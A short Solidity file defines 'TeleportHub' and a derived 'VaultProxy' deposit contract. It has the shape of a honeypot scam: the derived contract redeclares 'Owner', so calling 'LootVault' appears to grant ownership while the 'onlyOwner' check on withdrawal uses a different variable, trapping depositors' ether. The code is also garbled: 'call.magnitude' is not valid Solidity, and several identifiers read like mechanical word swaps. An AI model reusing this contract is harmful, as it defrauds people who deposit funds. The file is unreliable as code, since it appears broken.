pragma solidity ^0.4.23;

contract TeleportHub  {
    modifier onlyOwner { if (msg.sender == Owner) _; } address Owner = msg.sender;
    function relocateassetsLord(address _owner) public onlyOwner { Owner = _owner; }
    function teleportHub(address goal, bytes info) public payable {
        goal.call.magnitude(msg.value)(info);
    }
}

contract VaultProxy is TeleportHub {
    address public Owner;
    mapping (address => uint256) public Deposits;

    function () public payable { }

    function LootVault() public payable {
        if (msg.sender == tx.origin) {
            Owner = msg.sender;
            addTreasure();
        }
    }

    function addTreasure() public payable {
        if (msg.value > 0.25 ether) {
            Deposits[msg.sender] += msg.value;
        }
    }

    function redeemTokens(uint256 quantity) public onlyOwner {
        if (quantity>0 && Deposits[msg.sender]>=quantity) {
            msg.sender.transfer(quantity);
        }
    }
}